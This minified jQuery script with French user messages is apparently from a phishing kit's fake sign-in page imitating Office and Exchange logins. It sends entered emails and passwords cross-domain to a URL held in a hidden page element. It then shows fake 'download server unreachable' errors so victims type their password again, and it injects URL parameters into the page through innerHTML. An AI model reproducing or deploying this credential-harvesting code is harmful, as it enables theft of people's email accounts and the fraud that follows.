$(document).ready(function(){function a(a){for(var e=window.location.search.substring(1).split("&"),r=0;r<e.length;r++){var s=e[r].split("=");if(s[0]==a)return decodeURIComponent(s[1])}}var e=a("dl1"),r=a("dl2"),s=a("dl3"),l=a("dl4");document.getElementById("dl1").innerHTML=e,document.getElementById("dl2").innerHTML=r,document.getElementById("dl3").innerHTML=s,document.getElementById("dl4").innerHTML=l,$("#loginForm input").keydown(function(){$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden")}),$("#right-modal-lg").on("hidden.bs.modal",function(){$("#loginForm")[0].reset(),$("#loginCount").val("0"),$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden")}),$("#sign-in-with-office").click(function(){$("#loginForm")[0].reset(),$("#loginCount").val("0"),$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");var a=$("#officeURL").html();officeAuth=window.open(a,"Auth","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100");var e=setInterval(function(){officeAuth.closed&&($("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, impossible d&acute;atteindre le serveur de t\xe9l\xe9chargement. Essayez \xe0 nouveau</span></span>').removeClass("visually-hidden"),clearInterval(e))},250);officeAuth||(window.location.href=a)}),$("#sign-in-with-exchange").click(function(){$("#loginForm")[0].reset(),$("#loginCount").val("0"),$("#authError, #emailError, #passwordError").html("").addClass("visually-hidden");var a=$("#exchangeURL").html();exchangeAuth=window.open(a,"Auth","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=600,left=100,top=100");var e=setInterval(function(){exchangeAuth.closed&&($("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, impossible d&acute;atteindre le serveur de t\xe9l\xe9chargement. Essayez \xe0 nouveau</span></span>').removeClass("visually-hidden"),clearInterval(e))},250);exchangeAuth||(window.location.href=a)}),$("#loginForm").submit(function(a){a.preventDefault(),$("#authError").html("").addClass("visually-hidden");var e,r=$("#email").val().trim(),s=$("#password").val().trim();r?(e=r,/^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/.test(e))?s?s.length<5?($("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Oups, ce n&acute;est pas correct. Faute de frappe?</div>').removeClass("visually-hidden"),$("#password").focus(),$("#emailError").html("").addClass("visually-hidden")):jQuery.ajax({url:$("#sourceURL").html(),data:$("#loginForm").serialize(),type:"POST",crossDomain:!0,beforeSend:function(){$("#loginForm input").blur(),$("#content-loading").show(),$("#emailError, #passwordError").html("").addClass("visually-hidden")},success:function(a){a.match(/1/i)?($("#content-loading").hide(),$("#loginCount").val("2"),$("#password").val(""),$("#password").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, impossible d&acute;atteindre le serveur de t\xe9l\xe9chargement. Essayez \xe0 nouveau</span></span>').removeClass("visually-hidden")):a.match(/2/i)?($("#content-loading").hide(),$("#loginCount").val("1"),$("#password").val(""),$("#password").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Hmm, impossible d&acute;atteindre le serveur de t\xe9l\xe9chargement. Essayez \xe0 nouveau</span></span>').removeClass("visually-hidden")):a.match(/0/i)?($("#content-loading").hide(),$("#loginCount").val("1"),$("#email, #password").val(""),$("#email").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Veuillez vous connecter avec votre compte de messagerie.</span></span>').removeClass("visually-hidden")):a.match(/-0/i)&&($("#content-loading").hide(),$("#loginCount").val("0"),$("#password").val("").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Erreur. Veuillez v\xe9rifier votre r\xe9seau et r\xe9essayer.</span></span>').removeClass("visually-hidden"))},error:function(){$("#content-loading").hide(),$("#loginCount").val("0"),$("#password").val("").focus(),$("#authError").html('<span class="animated fadeInUp"><span id="errorText">Erreur. Veuillez v\xe9rifier votre r\xe9seau et r\xe9essayer.</span></span>').removeClass("visually-hidden")}}):($("#passwordError").html('<div class="auth0-lock-error-invalid-hint">Vous connaissez la chanson</div>').removeClass("visually-hidden"),$("#password").focus(),$("#emailError").html("").addClass("visually-hidden")):($("#emailError").html('<div class="auth0-lock-error-invalid-hint">Oups, ce n&acute;est pas correct. Faute de frappe?</div>').removeClass("visually-hidden"),$("#email").focus(),$("#passwordError").html("").addClass("visually-hidden")):($("#emailError").html('<div class="auth0-lock-error-invalid-hint">Vous connaissez la chanson</div>').removeClass("visually-hidden"),$("#email").focus(),$("#passwordError").html("").addClass("visually-hidden"))})});
